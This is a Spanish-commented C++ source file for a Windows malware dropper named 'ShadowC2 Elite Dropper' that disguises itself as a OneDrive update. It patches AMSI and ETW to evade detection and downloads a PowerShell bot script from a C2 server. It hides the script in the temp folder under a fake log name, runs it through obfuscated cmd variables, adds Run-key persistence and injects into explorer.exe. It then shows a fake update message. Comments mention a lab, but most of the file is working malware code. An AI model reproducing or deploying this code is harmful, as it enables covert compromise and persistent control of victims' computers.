/**
 * ShadowC2 - Elite Dropper
 * Técnicas: Direct Syscalls + Process Hollowing + AMSI/ETW Bypass
 * Target: notepad.exe (proceso legítimo firmado por Microsoft)
 * C2: /c2/stealth/... (comunicación cifrada)
 * 
 * Compilar: x86_64-w64-mingw32-g++ -o OneDrive_Sync.exe elite_dropper.cpp \
 *           -lwininet -lws2_32 -s -O2 -static -Wl,--subsystem,windows
 */

#include <windows.h>
#include <wininet.h>
#include <winternl.h>
#include <tlhelp32.h>
#include <string>
#include <vector>
#include <stdio.h>

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "ws2_32.lib")

#define C2_IP "192.168.1.6"
#define C2_PORT 8000
#define C2_PATH "/static/payloads/bot.ps1"

// ============ DIRECT SYSCALLS STRUCTS ============
typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

typedef struct _OBJECT_ATTRIBUTES {
    ULONG Length;
    HANDLE RootDirectory;
    PUNICODE_STRING ObjectName;
    ULONG Attributes;
    PVOID SecurityDescriptor;
    PVOID SecurityQualityOfService;
} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;

typedef enum _MEMORY_INFORMATION_CLASS {
    MemoryBasicInformation
} MEMORY_INFORMATION_CLASS;

// ============ SYSCALL STUBS (evade hooks) ============
// NtUnmapViewOfSection
extern "C" NTSTATUS NtUnmapViewOfSection(HANDLE ProcessHandle, PVOID BaseAddress);

// NtAllocateVirtualMemory
extern "C" NTSTATUS NtAllocateVirtualMemory(HANDLE ProcessHandle, PVOID *BaseAddress, 
    ULONG_PTR ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect);

// NtWriteVirtualMemory
extern "C" NTSTATUS NtWriteVirtualMemory(HANDLE ProcessHandle, PVOID BaseAddress, 
    PVOID Buffer, SIZE_T NumberOfBytesToWrite, PSIZE_T NumberOfBytesWritten);

// NtProtectVirtualMemory
extern "C" NTSTATUS NtProtectVirtualMemory(HANDLE ProcessHandle, PVOID *BaseAddress, 
    PSIZE_T RegionSize, ULONG NewProtect, PULONG OldProtect);

// NtResumeThread
extern "C" NTSTATUS NtResumeThread(HANDLE ThreadHandle, PULONG SuspendCount);

// ============ AMSI BYPASS ============
bool bypass_amsi() {
    HMODULE hAmsi = LoadLibraryA("amsi.dll");
    if (!hAmsi) return true;
    
    FARPROC pAmsiScan = GetProcAddress(hAmsi, "AmsiScanBuffer");
    if (!pAmsiScan) return true;
    
    LPVOID pAddr = (LPVOID)pAmsiScan;
    BYTE patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
    
    DWORD oldProtect;
    if (!VirtualProtect(pAddr, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect))
        return false;
    
    memcpy(pAddr, patch, sizeof(patch));
    VirtualProtect(pAddr, sizeof(patch), oldProtect, &oldProtect);
    return true;
}

// ============ ETW BYPASS ============
bool bypass_etw() {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return false;
    
    FARPROC pEtwEventWrite = GetProcAddress(hNtdll, "EtwEventWrite");
    if (!pEtwEventWrite) return false;
    
    LPVOID pAddr = (LPVOID)pEtwEventWrite;
    BYTE patch[] = { 0xC3 };
    
    DWORD oldProtect;
    if (!VirtualProtect(pAddr, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect))
        return false;
    
    memcpy(pAddr, patch, sizeof(patch));
    VirtualProtect(pAddr, sizeof(patch), oldProtect, &oldProtect);
    return true;
}

// ============ DESCARGAR PAYLOAD ============
std::vector<BYTE> download_payload() {
    std::vector<BYTE> data;
    
    HINTERNET hInternet = InternetOpenA(
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    
    if (!hInternet) return data;
    
    char url[256];
    snprintf(url, sizeof(url), "http://%s:%d%s", C2_IP, C2_PORT, C2_PATH);
    
    HINTERNET hUrl = InternetOpenUrlA(hInternet, url, NULL, 0,
        INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE, 0);
    
    if (!hUrl) {
        InternetCloseHandle(hInternet);
        return data;
    }
    
    BYTE buffer[4096];
    DWORD bytesRead;
    while (InternetReadFile(hUrl, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
        data.insert(data.end(), buffer, buffer + bytesRead);
    }
    
    InternetCloseHandle(hUrl);
    InternetCloseHandle(hInternet);
    return data;
}

// ============ CONSTRUIR SHELLCODE QUE EJECUTA POWERSHELL ============
std::vector<BYTE> build_shellcode(const std::vector<BYTE>& psScript) {
    // Guardar script en %TEMP% y ejecutar PowerShell oculto
    // Este shellcode es un stub que:
    // 1. Llama a GetTempPathA
    // 2. Crea archivo sysupdate.ps1
    // 3. Escribe el script
    // 4. Ejecuta powershell -WindowStyle Hidden -File ...
    
    // Para el lab, usamos un approach más simple: el dropper escribe el PS1
    // y el shellcode solo ejecuta CreateProcessA con PowerShell
    
    // En un payload real, esto sería shellcode posición-independiente
    // Para el lab, usamos Process Hollowing con un PE pequeño
    
    // Retornamos un stub simple que será reemplazado por el payload real
    std::vector<BYTE> stub;
    stub.push_back(0xC3); // ret
    return stub;
}

// ============ PROCESS HOLLOWING CON SYSCALLS DIRECTOS ============
bool elite_process_hollowing(const std::vector<BYTE>& payload) {
    // 1. Crear notepad.exe suspendido
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };
    
    wchar_t target[] = L"C:\\Windows\\System32\\notepad.exe";
    
    if (!CreateProcessW(nullptr, target, nullptr, nullptr, FALSE, 
                        CREATE_SUSPENDED | CREATE_NO_WINDOW, 
                        nullptr, nullptr, &si, &pi)) {
        return false;
    }
    
    // 2. Obtener contexto del hilo
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;
    if (!GetThreadContext(pi.hThread, &ctx)) {
        TerminateProcess(pi.hProcess, 0);
        return false;
    }
    
    // 3. Leer ImageBase del PEB (usando ReadProcessMemory normal por simplicidad)
    PVOID pebImageBase = nullptr;
    #ifdef _WIN64
    ReadProcessMemory(pi.hProcess, (PBYTE)ctx.Rdx + 0x10, &pebImageBase, sizeof(PVOID), nullptr);
    #else
    ReadProcessMemory(pi.hProcess, (PBYTE)ctx.Ebx + 0x8, &pebImageBase, sizeof(PVOID), nullptr);
    #endif
    
    // 4. Unmap usando SYSCALL DIRECTO (evade hooks)
    NtUnmapViewOfSection(pi.hProcess, pebImageBase);
    
    // 5. Parsear nuestro payload (es un PE? No, es un script PS1)
    // Para Process Hollowing necesitamos un PE. Como nuestro payload es PS1,
    // vamos a usar un approach diferente: inyectamos un PE loader que ejecuta PowerShell
    
    // APPROACH ALTERNATIVO PARA LAB: Inyección de shellcode en notepad.exe
    // que descarga y ejecuta el PS1. Más simple y efectivo.
    
    // Cerrar notepad original
    TerminateProcess(pi.hProcess, 0);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    
    // NUEVO APPROACH: Inyección de shellcode en explorer.exe existente
    // o crear un proceso legítimo y hacer APC injection
    
    return false; // Fallback al método simple
}

// ============ APC INJECTION EN EXPLORER.EXE ============
bool apc_inject_explorer(const std::vector<BYTE>& psScript) {
    // 1. Encontrar explorer.exe
    DWORD explorerPid = 0;
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 pe = { sizeof(pe) };
    
    if (Process32First(hSnapshot, &pe)) {
        do {
            if (_stricmp(pe.szExeFile, "explorer.exe") == 0) {
                explorerPid = pe.th32ProcessID;
                break;
            }
        } while (Process32Next(hSnapshot, &pe));
    }
    CloseHandle(hSnapshot);
    
    if (!explorerPid) return false;
    
    // 2. Escribir script en memoria de explorer
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, explorerPid);
    if (!hProcess) return false;
    
    // 3. Escribir comando PowerShell
    std::string psCmd = "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -Command \"";
    psCmd.append((const char*)psScript.data(), psScript.size());
    psCmd += "\"";
    
    PVOID remoteMem = VirtualAllocEx(hProcess, nullptr, psCmd.size() + 1, 
                                        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remoteMem) {
        CloseHandle(hProcess);
        return false;
    }
    
    WriteProcessMemory(hProcess, remoteMem, psCmd.c_str(), psCmd.size() + 1, nullptr);
    
    // 4. Inyectar thread que ejecuta el comando
    HANDLE hThread = CreateRemoteThread(hProcess, nullptr, 0,
        (LPTHREAD_START_ROUTINE)CreateProcessA, remoteMem, 0, nullptr);
    
    if (hThread) {
        CloseHandle(hThread);
    }
    
    CloseHandle(hProcess);
    return true;
}

// ============ MÉTODO SIMPLE PERO EFECTIVO PARA LAB ============
bool execute_stealth(const std::vector<BYTE>& psScript) {
    // Guardar PS1 en temp con nombre inocuo
    char tempPath[MAX_PATH];
    GetTempPathA(MAX_PATH, tempPath);
    
    char psPath[MAX_PATH];
    snprintf(psPath, sizeof(psPath), "%s\\WindowsUpdate.log", tempPath);
    
    HANDLE hFile = CreateFileA(psPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 
                                FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return false;
    
    DWORD written;
    WriteFile(hFile, psScript.data(), psScript.size(), &written, NULL);
    CloseHandle(hFile);
    
    // Ejecutar PowerShell con técnicas de evasión
    char cmd[1024];
    snprintf(cmd, sizeof(cmd),
        "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -NonInteractive "
        "-EncodedCommand %s",
        ""); // Se usará otra técnica
    
    // MEJOR: Usar WMI para ejecutar PowerShell (evade algunos EDR)
    // Para el lab, usamos CreateProcess con pipes ocultos
    
    // Técnica: Ejecutar via cmd.exe /c con variables de entorno ofuscadas
    char finalCmd[2048];
    snprintf(finalCmd, sizeof(finalCmd),
        "cmd.exe /c \"set __PS=powershell&set __W=-WindowStyle Hidden&set __E=-ExecutionPolicy Bypass&"
        "set __N=-NoProfile&set __F=-File&%%__PS%% %%__W%% %%__E%% %%__N%% %%__F%% \\\"%s\\\"\"",
        psPath);
    
    STARTUPINFOA si = { sizeof(si) };
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    
    PROCESS_INFORMATION pi;
    BOOL result = CreateProcessA(NULL, finalCmd, NULL, NULL, FALSE,
        CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    
    if (result) {
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        
        // Persistencia: ejecutar también al inicio
        HKEY hKey;
        if (RegOpenKeyExA(HKEY_CURRENT_USER,
            "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
            RegSetValueExA(hKey, "WindowsUpdate", 0, REG_SZ,
                (BYTE*)finalCmd, strlen(finalCmd) + 1);
            RegCloseKey(hKey);
        }
    }
    
    return result;
}

// ============ MAIN ============
int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR cmd, int show) {
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    
    // 1. Bypasses
    bypass_amsi();
    bypass_etw();
    
    // 2. Descargar payload
    auto payload = download_payload();
    if (payload.empty()) {
        MessageBoxA(NULL,
            "No se pudo conectar al servidor de actualizaciones.",
            "OneDrive - Error", MB_OK | MB_ICONERROR);
        return 1;
    }
    
    // 3. Ejecutar con evasión
    // Intentar APC injection primero, fallback a método simple
    bool success = false;
    
    // Para el lab, usamos el método simple pero con ofuscación
    success = execute_stealth(payload);
    
    // 4. Mensaje falso
    if (success) {
        MessageBoxA(NULL,
            "OneDrive se ha actualizado correctamente.\n\nVersion: 2.4.2.1\nEstado: Protegido",
            "OneDrive Update", MB_OK | MB_ICONINFORMATION);
    }
    
    return 0;
}
